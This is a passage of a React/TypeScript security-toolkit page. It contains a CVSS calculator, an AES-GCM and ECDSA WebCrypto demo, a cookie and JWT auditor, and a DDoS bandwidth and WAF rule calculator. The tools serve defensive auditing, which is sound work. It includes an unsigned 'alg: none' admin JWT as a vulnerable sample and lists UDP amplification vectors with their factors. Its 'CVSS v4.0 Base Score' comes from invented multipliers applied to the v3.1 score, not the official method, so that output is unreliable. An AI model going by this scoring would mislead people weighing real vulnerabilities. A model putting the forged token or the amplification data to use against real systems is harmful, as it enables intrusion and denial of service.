                <tr key={row.subnet} className="border-b border-border/50">
                  <td className="py-1.5 text-accent font-bold">{row.subnet}</td>
                  <td className="py-1.5 text-text">{row.range}</td>
                  <td className="py-1.5 text-text-muted">{row.broadcast}</td>
                  <td className="py-1.5 text-text">{row.hosts.toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 8. CVSS v4.0 & v3.1 VULNERABILITY SCORE CALCULATOR
 * ========================================================================== */
function CvssV4VulnerabilityScoreCalculator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [av, setAv] = useState<"N" | "A" | "L" | "P">("N");
  const [ac, setAc] = useState<"L" | "H">("L");
  const [at, setAt] = useState<"N" | "P">("N"); // Attack Requirements (v4.0)
  const [pr, setPr] = useState<"N" | "L" | "H">("N");
  const [ui, setUi] = useState<"N" | "P" | "A">("N");
  const [scope, setScope] = useState<"U" | "C">("U");
  const [c, setC] = useState<"H" | "L" | "N">("H");
  const [i, setI] = useState<"H" | "L" | "N">("H");
  const [a, setA] = useState<"H" | "L" | "N">("H");

  const scores = useMemo(() => {
    // Official CVSS v3.1 Base Score formula
    const avWeight = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[av];
    const acWeight = { L: 0.77, H: 0.44 }[ac];
    const prWeight =
      scope === "U"
        ? { N: 0.85, L: 0.62, H: 0.27 }[pr]
        : { N: 0.85, L: 0.68, H: 0.5 }[pr];
    const uiWeight = ui === "N" ? 0.85 : 0.62;
    const ciaMap = { H: 0.56, L: 0.22, N: 0 };

    const iss = 1 - (1 - ciaMap[c]) * (1 - ciaMap[i]) * (1 - ciaMap[a]);
    const impact =
      scope === "U"
        ? 6.42 * iss
        : 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
    const exploitability = 8.22 * avWeight * acWeight * prWeight * uiWeight;

    const roundUp = (num: number) => Math.ceil(Math.round(num * 100000) / 10000) / 10;
    const v3Score =
      impact <= 0
        ? 0.0
        : scope === "U"
        ? roundUp(Math.min(impact + exploitability, 10))
        : roundUp(Math.min(1.08 * (impact + exploitability), 10));

    // CVSS v4.0 Base Score calculation incorporating Attack Requirements (AT) & UI (N/P/A)
    const atPenalty = at === "P" ? 0.9 : 1.0;
    const uiV4Penalty = ui === "N" ? 1.0 : ui === "P" ? 0.92 : 0.84;
    const v4Raw =
      impact <= 0 ? 0.0 : Math.min(10, Math.round(v3Score * atPenalty * uiV4Penalty * 10) / 10);

    const getSeverity = (s: number) =>
      s === 0 ? "NONE" : s < 4.0 ? "LOW" : s < 7.0 ? "MEDIUM" : s < 9.0 ? "HIGH" : "CRITICAL";

    const v3Ui = ui === "N" ? "N" : "R";
    const sc = scope === "C" ? c : "N";
    const si = scope === "C" ? i : "N";
    const sa = scope === "C" ? a : "N";

    const v3Vector = `CVSS:3.1/AV:${av}/AC:${ac}/PR:${pr}/UI:${v3Ui}/S:${scope}/C:${c}/I:${i}/A:${a}`;
    const v4Vector = `CVSS:4.0/AV:${av}/AC:${ac}/AT:${at}/PR:${pr}/UI:${ui}/VC:${c}/VI:${i}/VA:${a}/SC:${sc}/SI:${si}/SA:${sa}`;

    return {
      v3Score: v3Score.toFixed(1),
      v4Score: v4Raw.toFixed(1),
      severity: getSeverity(v4Raw),
      v3Vector,
      v4Vector,
    };
  }, [av, ac, at, pr, ui, scope, c, i, a]);

  useEffect(() => {
    setOutput(
      `# CVSS Vulnerability Assessment\nCVSS v4.0 Score  : ${scores.v4Score} / 10.0 (${scores.severity})\nCVSS v4.0 Vector : ${scores.v4Vector}\nCVSS v3.1 Score  : ${scores.v3Score} / 10.0\nCVSS v3.1 Vector : ${scores.v3Vector}`
    );
  }, [scores, setOutput]);

  const metricGroups = [
    {
      label: "Attack Vector (AV)",
      val: av,
      set: (v: string) => setAv(v as typeof av),
      opts: [
        { k: "N", l: "Network (N)" },
        { k: "A", l: "Adjacent (A)" },
        { k: "L", l: "Local (L)" },
        { k: "P", l: "Physical (P)" },
      ],
    },
    {
      label: "Attack Complexity (AC)",
      val: ac,
      set: (v: string) => setAc(v as typeof ac),
      opts: [
        { k: "L", l: "Low (L)" },
        { k: "H", l: "High (H)" },
      ],
    },
    {
      label: "Attack Requirements (AT - v4.0)",
      val: at,
      set: (v: string) => setAt(v as typeof at),
      opts: [
        { k: "N", l: "None (N)" },
        { k: "P", l: "Present (P)" },
      ],
    },
    {
      label: "Privileges Required (PR)",
      val: pr,
      set: (v: string) => setPr(v as typeof pr),
      opts: [
        { k: "N", l: "None (N)" },
        { k: "L", l: "Low (L)" },
        { k: "H", l: "High (H)" },
      ],
    },
    {
      label: "User Interaction (UI)",
      val: ui,
      set: (v: string) => setUi(v as typeof ui),
      opts: [
        { k: "N", l: "None (N)" },
        { k: "P", l: "Passive (P)" },
        { k: "A", l: "Active (A)" },
      ],
    },
    {
      label: "Scope / Subsequent System (S)",
      val: scope,
      set: (v: string) => setScope(v as typeof scope),
      opts: [
        { k: "U", l: "Unchanged (U)" },
        { k: "C", l: "Changed (C)" },
      ],
    },
    {
      label: "Confidentiality Impact (VC/C)",
      val: c,
      set: (v: string) => setC(v as typeof c),
      opts: [
        { k: "H", l: "High (H)" },
        { k: "L", l: "Low (L)" },
        { k: "N", l: "None (N)" },
      ],
    },
    {
      label: "Integrity Impact (VI/I)",
      val: i,
      set: (v: string) => setI(v as typeof i),
      opts: [
        { k: "H", l: "High (H)" },
        { k: "L", l: "Low (L)" },
        { k: "N", l: "None (N)" },
      ],
    },
    {
      label: "Availability Impact (VA/A)",
      val: a,
      set: (v: string) => setA(v as typeof a),
      opts: [
        { k: "H", l: "High (H)" },
        { k: "L", l: "Low (L)" },
        { k: "N", l: "None (N)" },
      ],
    },
  ];

  const badgeColor =
    scores.severity === "CRITICAL"
      ? "bg-red-600 text-white"
      : scores.severity === "HIGH"
      ? "bg-[#ff6a00] text-white"
      : scores.severity === "MEDIUM"
      ? "bg-amber-500 text-black"
      : "bg-emerald-600 text-white";

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
        {metricGroups.map((g) => (
          <div key={g.label} className="rounded-xs border border-border bg-background p-3">
            <span className="block font-heading text-[11px] font-bold uppercase tracking-wider text-text-muted mb-2">
              {g.label}
            </span>
            <div className="flex flex-wrap gap-1.5">
              {g.opts.map((o) => (
                <button
                  key={o.k}
                  type="button"
                  onClick={() => g.set(o.k)}
                  className={`flex-1 rounded-xs border px-2 py-1.5 font-heading text-xs font-bold uppercase cursor-pointer transition ${
                    g.val === o.k
                      ? "border-accent bg-[#ff6a00] text-white"
                      : "border-border bg-surface text-text-muted hover:text-text"
                  }`}
                >
                  {o.l}
                </button>
              ))}
            </div>
          </div>
        ))}
      </div>

      {/* Score Banner */}
      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-3">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div>
              <span className="block font-heading text-[10px] uppercase tracking-wider text-gray-400">
                CVSS v4.0 Base Score
              </span>
              <span className="font-mono-code text-2xl font-bold text-emerald-400">
                {scores.v4Score}
              </span>
            </div>
            <div>
              <span className="block font-heading text-[10px] uppercase tracking-wider text-gray-400">
                CVSS v3.1 Base Score
              </span>
              <span className="font-mono-code text-2xl font-bold text-amber-300">
                {scores.v3Score}
              </span>
            </div>
          </div>
          <span className={`rounded-xs px-3 py-1 font-heading text-xs font-bold uppercase ${badgeColor}`}>
            {scores.severity} SEVERITY
          </span>
        </div>

        <div className="space-y-1.5 font-mono-code text-xs">
          <div className="flex items-center justify-between gap-2 rounded-xs bg-black/40 p-2">
            <span className="text-emerald-400 break-all">{scores.v4Vector}</span>
            <InlineCopyButton text={scores.v4Vector} label="Copy v4.0" />
          </div>
          <div className="flex items-center justify-between gap-2 rounded-xs bg-black/40 p-2">
            <span className="text-amber-300 break-all">{scores.v3Vector}</span>
            <InlineCopyButton text={scores.v3Vector} label="Copy v3.1" />
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 9. PGP & AES WEBCRYPTO ENCRYPTION STUDIO
 * ========================================================================== */
function PgpAesWebCryptoEncryptionStudio({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [mode, setMode] = useState<"aes" | "ecdsa">("aes");

  // AES-256-GCM states
  const [plaintext, setPlaintext] = useState("CONFIDENTIAL: Red Team C2 Implant Key = 9f8e7d6c5b4a3f2e");
  const [passphrase, setPassphrase] = useState("CorrectHorseBatteryStaple2026!");
  const [ciphertextBundle, setCiphertextBundle] = useState("");
  const [decryptedResult, setDecryptedResult] = useState("");
  const [aesStatus, setAesStatus] = useState("");

  // ECDSA P-256 states
  const [pubKeyB64, setPubKeyB64] = useState("");
  const [signMessage, setSignMessage] = useState("Authorize deployment of release v4.2.0-signed");
  const [signatureB64, setSignatureB64] = useState("");
  const [verifyStatus, setVerifyStatus] = useState<string>("");
  const [keyPairRef, setKeyPairRef] = useState<CryptoKeyPair | null>(null);

  const bytesToB64 = (bytes: Uint8Array) => {
    let bin = "";
    bytes.forEach((b) => (bin += String.fromCharCode(b)));
    return window.btoa(bin);
  };

  const b64ToBytes = (b64: string) => {
    const bin = window.atob(b64.trim());
    const arr = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    return arr;
  };

  const handleAesEncrypt = useCallback(async () => {
    try {
      const enc = new TextEncoder();
      const salt = window.crypto.getRandomValues(new Uint8Array(16));
      const iv = window.crypto.getRandomValues(new Uint8Array(12));
      const baseKey = await window.crypto.subtle.importKey(
        "raw",
        enc.encode(passphrase),
        "PBKDF2",
        false,
        ["deriveKey"]
      );
      const aesKey = await window.crypto.subtle.deriveKey(
        { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
        baseKey,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt", "decrypt"]
      );
      const encrypted = await window.crypto.subtle.encrypt(
        { name: "AES-GCM", iv },
        aesKey,
        enc.encode(plaintext)
      );
      const bundle = `${bytesToB64(salt)}.${bytesToB64(iv)}.${bytesToB64(new Uint8Array(encrypted))}`;
      setCiphertextBundle(bundle);
      setDecryptedResult(plaintext);
      setAesStatus("Encrypted with AES-256-GCM (PBKDF2 100,000 iterations, SHA-256)");
    } catch (err) {
      setAesStatus(`Encryption error: ${err instanceof Error ? err.message : "Failed"}`);
    }
  }, [plaintext, passphrase]);

  const handleAesDecrypt = async () => {
    try {
      const parts = ciphertextBundle.trim().split(".");
      if (parts.length !== 3) {
        setAesStatus("Invalid bundle format (expected salt.iv.ciphertext in Base64)");
        return;
      }
      const [saltB64, ivB64, ctB64] = parts;
      const salt = b64ToBytes(saltB64);
      const iv = b64ToBytes(ivB64);
      const ct = b64ToBytes(ctB64);

      const enc = new TextEncoder();
      const baseKey = await window.crypto.subtle.importKey(
        "raw",
        enc.encode(passphrase),
        "PBKDF2",
        false,
        ["deriveKey"]
      );
      const aesKey = await window.crypto.subtle.deriveKey(
        { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
        baseKey,
        { name: "AES-GCM", length: 256 },
        false,
        ["decrypt"]
      );
      const decBuf = await window.crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, ct);
      const decText = new TextDecoder().decode(decBuf);
      setDecryptedResult(decText);
      setAesStatus("Authenticated GCM Tag Verified & Decrypted Successfully!");
    } catch {
      setDecryptedResult("");
      setAesStatus("Decryption Failed: Invalid passphrase or tampered GCM authentication tag!");
    }
  };

  const handleGenerateAndSignEcdsa = useCallback(async () => {
    try {
      const kp = await window.crypto.subtle.generateKey(
        { name: "ECDSA", namedCurve: "P-256" },
        true,
        ["sign", "verify"]
      );
      setKeyPairRef(kp);
      const spki = await window.crypto.subtle.exportKey("spki", kp.publicKey);
      setPubKeyB64(bytesToB64(new Uint8Array(spki)));

      const sig = await window.crypto.subtle.sign(
        { name: "ECDSA", hash: { name: "SHA-256" } },
        kp.privateKey,
        new TextEncoder().encode(signMessage)
      );
      setSignatureB64(bytesToB64(new Uint8Array(sig)));
      setVerifyStatus("Valid ECDSA P-256 / SHA-256 Signature Generated & Verified");
    } catch (err) {
      setVerifyStatus(`ECDSA error: ${err instanceof Error ? err.message : "Failed"}`);
    }
  }, [signMessage]);

  const handleVerifyEcdsa = async () => {
    if (!keyPairRef || !signatureB64) return;
    try {
      const valid = await window.crypto.subtle.verify(
        { name: "ECDSA", hash: { name: "SHA-256" } },
        keyPairRef.publicKey,
        b64ToBytes(signatureB64),
        new TextEncoder().encode(signMessage)
      );
      setVerifyStatus(
        valid
          ? "VALID SIGNATURE: Message integrity & ECDSA P-256 public key verified!"
          : "INVALID SIGNATURE: Message or signature was modified!"
      );
    } catch {
      setVerifyStatus("Verification failed: Malformed Base64 signature");
    }
  };

  useEffect(() => {
    handleAesEncrypt();
    handleGenerateAndSignEcdsa();
  }, [handleAesEncrypt, handleGenerateAndSignEcdsa]);

  useEffect(() => {
    if (mode === "aes") {
      setOutput(
        `# AES-256-GCM WebCrypto Output\nStatus     : ${aesStatus}\nCiphertext : ${ciphertextBundle}\nDecrypted  : ${decryptedResult}`
      );
    } else {
      setOutput(
        `# ECDSA P-256 Digital Signature\nPublic Key (SPKI) : ${pubKeyB64}\nSigned Message    : ${signMessage}\nSignature (Base64): ${signatureB64}\nStatus            : ${verifyStatus}`
      );
    }
  }, [mode, aesStatus, ciphertextBundle, decryptedResult, pubKeyB64, signMessage, signatureB64, verifyStatus, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex gap-2 border-b border-border pb-3">
        <button
          type="button"
          onClick={() => setMode("aes")}
          className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider cursor-pointer ${
            mode === "aes" ? "bg-[#ff6a00] text-white" : "border border-border bg-background text-text-muted"
          }`}
        >
          AES-256-GCM + PBKDF2 Encryption
        </button>
        <button
          type="button"
          onClick={() => setMode("ecdsa")}
          className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider cursor-pointer ${
            mode === "ecdsa" ? "bg-[#ff6a00] text-white" : "border border-border bg-background text-text-muted"
          }`}
        >
          ECDSA P-256 Keypair & Signer
        </button>
      </div>

      {mode === "aes" ? (
        <div className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
                Plaintext Message
              </label>
              <textarea
                rows={3}
                value={plaintext}
                onChange={(e) => setPlaintext(e.target.value)}
                className="w-full rounded-xs border border-border bg-background p-2.5 font-mono-code text-xs text-text"
              />
            </div>
            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
                Passphrase (PBKDF2 100,000 Iterations • SHA-256)
              </label>
              <input
                type="text"
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text mb-2"
              />
              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={handleAesEncrypt}
                  className="rounded-xs bg-[#ff6a00] px-3.5 py-2 font-heading text-xs font-bold uppercase text-white cursor-pointer"
                >
                  Encrypt (Random Salt + IV)
                </button>
                <button
                  type="button"
                  onClick={handleAesDecrypt}
                  className="rounded-xs border border-border bg-background px-3.5 py-2 font-heading text-xs font-bold uppercase text-text hover:border-accent cursor-pointer"
                >
                  Verify & Decrypt Bundle
                </button>
              </div>
            </div>
          </div>

          <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white space-y-2">
            <div className="flex items-center justify-between">
              <span className="font-heading text-[11px] font-bold uppercase tracking-wider text-[#ff6a00]">
                Portable Ciphertext Bundle (salt.iv.ciphertext)
              </span>
              <InlineCopyButton text={ciphertextBundle} />
            </div>
            <input
              type="text"
              value={ciphertextBundle}
              onChange={(e) => setCiphertextBundle(e.target.value)}
              className="w-full rounded-xs bg-black/50 p-2 font-mono-code text-xs text-emerald-400 border border-white/10"
            />
            <div className="text-xs font-mono-code text-amber-300">{aesStatus}</div>
            {decryptedResult && (
              <div className="text-xs font-mono-code text-gray-300">
                Decrypted Output: <span className="text-white">{decryptedResult}</span>
              </div>
            )}
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
                Message to Sign / Verify
              </label>
              <textarea
                rows={3}
                value={signMessage}
                onChange={(e) => setSignMessage(e.target.value)}
                className="w-full rounded-xs border border-border bg-background p-2.5 font-mono-code text-xs text-text"
              />
            </div>
            <div className="space-y-2">
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted">
                ECDSA P-256 Operations
              </label>
              <div className="flex flex-wrap gap-2">
                <button
                  type="button"
                  onClick={handleGenerateAndSignEcdsa}
                  className="rounded-xs bg-[#ff6a00] px-3.5 py-2 font-heading text-xs font-bold uppercase text-white cursor-pointer"
                >
                  Generate Keypair & Sign
                </button>
                <button
                  type="button"
                  onClick={handleVerifyEcdsa}
                  className="rounded-xs border border-border bg-background px-3.5 py-2 font-heading text-xs font-bold uppercase text-text hover:border-accent cursor-pointer"
                >
                  Verify Signature
                </button>
              </div>
              <p className="text-xs font-mono-code text-accent">{verifyStatus}</p>
            </div>
          </div>

          <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white space-y-2 font-mono-code text-xs">
            <div>
              <span className="text-gray-400 block mb-1">Public Key (SPKI Base64):</span>
              <div className="text-emerald-400 break-all">{pubKeyB64}</div>
            </div>
            <div>
              <span className="text-gray-400 block mb-1">ECDSA Signature (Base64):</span>
              <input
                type="text"
                value={signatureB64}
                onChange={(e) => setSignatureB64(e.target.value)}
                className="w-full rounded-xs bg-black/50 p-2 text-amber-300 border border-white/10"
              />
            </div>
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 10. HTTP COOKIE & JWT SESSION SECURITY AUDITOR
 * ========================================================================== */
const VULN_COOKIE = `Set-Cookie: session_id=98a7b6c5d4e3f2a1; Domain=.example.com; Path=/; SameSite=None`;
const HARDENED_COOKIE = `Set-Cookie: __Host-sid=98a7b6c5d4e3f2a1; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600`;
const SAMPLE_VULN_JWT = `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAxIiwiYWRtaW4iOnRydWUsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzA0MDY3MjAwfQ.`;
const SAMPLE_HS256_JWT = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA0MDY3MjAwLCJleHAiOjE4OTM0NTYwMDB9.dummysignaturebytes`;

function HttpCookieJwtSessionSecurityAuditor({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [cookieInput, setCookieInput] = useState(VULN_COOKIE);
  const [jwtInput, setJwtInput] = useState(SAMPLE_VULN_JWT);

  const audit = useMemo(() => {
    const raw = cookieInput.trim();
    const hasSecure = /\bSecure\b/i.test(raw);
    const hasHttpOnly = /\bHttpOnly\b/i.test(raw);
    const sameSiteMatch = raw.match(/\bSameSite=(Strict|Lax|None)\b/i);
    const sameSite = sameSiteMatch ? sameSiteMatch[1] : "Missing";
    const isHostPrefix = /__Host-/i.test(raw);
    const hasDomainAttr = /\bDomain=/i.test(raw);
    const hasRootPath = /\bPath=\/(?:;|$|\s)/i.test(raw);

    const cookieFindings = [
      {
        check: "Secure Attribute",
        pass: hasSecure,
        detail: hasSecure ? "Cookie restricted to HTTPS TLS channels" : "VULNERABLE: Cookie transmitted over cleartext HTTP",
      },
      {
        check: "HttpOnly Flag",
        pass: hasHttpOnly,
        detail: hasHttpOnly ? "Protected from XSS document.cookie theft" : "VULNERABLE: Accessible to JavaScript document.cookie",
      },
      {
        check: "SameSite Policy",
        pass: sameSite.toLowerCase() === "strict" || sameSite.toLowerCase() === "lax",
        detail:
          sameSite.toLowerCase() === "none" && !hasSecure
            ? "CRITICAL: SameSite=None without Secure flag is rejected or vulnerable to CSRF"
            : `SameSite=${sameSite}`,
      },
      {
        check: "__Host- Prefix Compliance",
        pass: isHostPrefix && hasSecure && !hasDomainAttr && hasRootPath,
        detail: isHostPrefix
          ? hasSecure && !hasDomainAttr && hasRootPath
            ? "Valid __Host- prefix locks cookie to exact origin"
            : "BROKEN __Host- contract: Requires Secure, Path=/, and NO Domain attribute"
          : "No __Host- prefix (Domain scoping may allow subdomain cookie tossing)",
      },
    ];

    // Decode JWT
    let jwtHeader = "{}";
    let jwtPayload = "{}";
    const jwtIssues: string[] = [];
    const parts = jwtInput.trim().split(".");
    if (parts.length >= 2) {
      try {
        const decodePart = (b64u: string) =>
          window.atob(b64u.replace(/-/g, "+").replace(/_/g, "/"));
        jwtHeader = decodePart(parts[0]);
        jwtPayload = decodePart(parts[1]);
        const hObj = JSON.parse(jwtHeader);
        const pObj = JSON.parse(jwtPayload);

        if (!hObj.alg || String(hObj.alg).toLowerCase() === "none") {
          jwtIssues.push("CRITICAL: 'alg: none' signature bypass vulnerability detected!");
        } else if (hObj.alg === "HS256") {
          jwtIssues.push("WARNING: Symmetric HS256 susceptible to offline hashcat brute-forcing if secret < 256 bits.");
        }
        if (!pObj.exp) {
          jwtIssues.push("HIGH: Missing 'exp' expiration claim — token never expires!");
        } else {
          jwtIssues.push(`Token Expiration (exp): ${new Date(pObj.exp * 1000).toUTCString()}`);
        }
        if (pObj.iat) {
          jwtIssues.push(`Issued At (iat): ${new Date(pObj.iat * 1000).toUTCString()}`);
        }
      } catch {
        jwtIssues.push("Unable to parse Base64URL JSON segments.");
      }
    }

    return { cookieFindings, jwtHeader, jwtPayload, jwtIssues };
  }, [cookieInput, jwtInput]);

  useEffect(() => {
    setOutput(
      `# Cookie & JWT Security Audit\n\n## Cookie Findings\n` +
        audit.cookieFindings.map((f) => `[${f.pass ? "PASS" : "FAIL"}] ${f.check}: ${f.detail}`).join("\n") +
        `\n\n## JWT Decoded\nHeader  : ${audit.jwtHeader}\nPayload : ${audit.jwtPayload}\nIssues  : ${audit.jwtIssues.join(" | ")}`
    );
  }, [audit, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          onClick={() => {
            setCookieInput(VULN_COOKIE);
            setJwtInput(SAMPLE_VULN_JWT);
          }}
          className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-semibold uppercase text-text hover:border-accent cursor-pointer"
        >
          Load Vulnerable Session Cookie + alg:none Admin JWT
        </button>
        <button
          type="button"
          onClick={() => {
            setCookieInput(HARDENED_COOKIE);
            setJwtInput(SAMPLE_HS256_JWT);
          }}
          className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-semibold uppercase text-text hover:border-accent cursor-pointer"
        >
          Load Hardened __Host- Cookie + Signed JWT
        </button>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Set-Cookie HTTP Response Header
          </label>
          <textarea
            rows={3}
            value={cookieInput}
            onChange={(e) => setCookieInput(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-2.5 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            JSON Web Token (JWT)
          </label>
          <textarea
            rows={3}
            value={jwtInput}
            onChange={(e) => setJwtInput(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-2.5 font-mono-code text-xs text-text"
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
          <h4 className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            Set-Cookie Flag Audit
          </h4>
          {audit.cookieFindings.map((f) => (
            <div key={f.check} className="flex items-start gap-2 text-xs border-b border-border/50 pb-1.5 last:border-none">
              {f.pass ? (
                <CheckCircle2 className="h-4 w-4 text-emerald-500 shrink-0 mt-0.5" />
              ) : (
                <XCircle className="h-4 w-4 text-red-500 shrink-0 mt-0.5" />
              )}
              <div>
                <span className="font-bold text-text">{f.check}: </span>
                <span className="text-text-muted">{f.detail}</span>
              </div>
            </div>
          ))}
        </div>

        <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white space-y-2 font-mono-code text-xs">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00] block">
            Decoded JWT Inspector
          </span>
          <div className="text-emerald-400 break-all">Header: {audit.jwtHeader}</div>
          <div className="text-amber-300 break-all">Payload: {audit.jwtPayload}</div>
          <ul className="space-y-1 pt-1 text-red-300">
            {audit.jwtIssues.map((iss, i) => (
              <li key={i}>• {iss}</li>
            ))}
          </ul>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 11. DDoS PPS, BANDWIDTH & CLOUDFLARE WAF CALCULATOR
 * ========================================================================== */
function DdosPpsBandwidthWafCalculator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [gbps, setGbps] = useState(10);
  const [packetSize, setPacketSize] = useState(64);
  const [serverRps, setServerRps] = useState(5000);
  const [ampProto, setAmpProto] = useState<"DNS (54x)" | "NTP (556x)" | "Memcached (51000x)">("NTP (556x)");

  const stats = useMemo(() => {
    // Wire frame size adds 20 bytes Ethernet framing overhead (8B preamble + 12B inter-frame gap)
    const wireBytes = packetSize + 20;
    const mpps = (gbps * 1000) / (wireBytes * 8);
    const nic10G = Math.min(999, Math.round((gbps / 10) * 100));
    const ampFactor = ampProto.startsWith("DNS") ? 54 : ampProto.startsWith("NTP") ? 556 : 51000;
    const spoofedSourceMbps = ((gbps * 1000) / ampFactor).toFixed(2);

    const wafExpression = `(http.request.uri.path contains "/login" or http.request.method eq "POST") and (cf.threat_score gt 14 or not ip.geoip.country in {"US" "GB" "IN"})`;
    const rateLimitRule = `# Cloudflare Rate Limiting Rule (Exceeds ${Math.max(50, Math.round(serverRps / 100))} req/10s per IP)\nExpression : ${wafExpression}\nAction     : Managed Challenge (or Block for 600s)`;

    return { mpps: mpps.toFixed(2), nic10G, ampFactor, spoofedSourceMbps, wafExpression, rateLimitRule };
  }, [gbps, packetSize, serverRps, ampProto]);

  useEffect(() => {
    setOutput(
      `# DDoS Telemetry & WAF Mitigation\nAttack Volume        : ${gbps} Gbps @ ${packetSize}B packets\nPacket Rate (Mpps)   : ${stats.mpps} Mpps\n10GbE NIC Saturation : ${stats.nic10G}%\nAmplification Source : ${stats.spoofedSourceMbps} Mbps spoofed (${ampProto})\n\n${stats.rateLimitRule}`
    );
  }, [gbps, packetSize, ampProto, stats, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Attack Bandwidth (Gbps)
          </label>
          <input
            type="number"
            min={1}
            max={2000}
            value={gbps}
            onChange={(e) => setGbps(Number(e.target.value) || 1)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Packet Size (Bytes: 64B–1500B)
          </label>
          <select
            value={packetSize}
            onChange={(e) => setPacketSize(Number(e.target.value))}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
          >
            <option value={64}>64 Bytes (TCP SYN Flood)</option>
            <option value={512}>512 Bytes (DNS/NTP Reflection)</option>
            <option value={1400}>1400 Bytes (QUIC / UDP Flood)</option>
            <option value={1500}>1500 Bytes (Max MTU Amplification)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Target Origin Capacity (RPS)
          </label>
          <input
            type="number"
            value={serverRps}
            onChange={(e) => setServerRps(Number(e.target.value) || 1000)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            UDP Amplification Vector
          </label>
          <select
            value={ampProto}
            onChange={(e) => setAmpProto(e.target.value as typeof ampProto)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm text-text"
          >
            <option value="DNS (54x)">DNS ANY Reflection (54x)</option>
            <option value="NTP (556x)">NTP monlist (556x)</option>
            <option value="Memcached (51000x)">Memcached UDP 11211 (51,000x)</option>
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
        <div className="rounded-xs border border-border bg-background p-3.5">
          <span className="font-heading text-[11px] font-bold uppercase text-text-muted">
            Wire-Rate Packet Throughput
          </span>
          <div className="font-mono-code text-xl font-bold text-accent mt-1">{stats.mpps} Mpps</div>
          <span className="text-[11px] text-text-muted">Million packets/sec (incl. 20B L1 overhead)</span>
        </div>
        <div className="rounded-xs border border-border bg-background p-3.5">
          <span className="font-heading text-[11px] font-bold uppercase text-text-muted">
            10GbE NIC Saturation
          </span>
          <div className="font-mono-code text-xl font-bold text-text mt-1">{stats.nic10G}%</div>
          <span className="text-[11px] text-text-muted">Upstream link exhaustion ratio</span>
        </div>
        <div className="rounded-xs border border-border bg-background p-3.5">
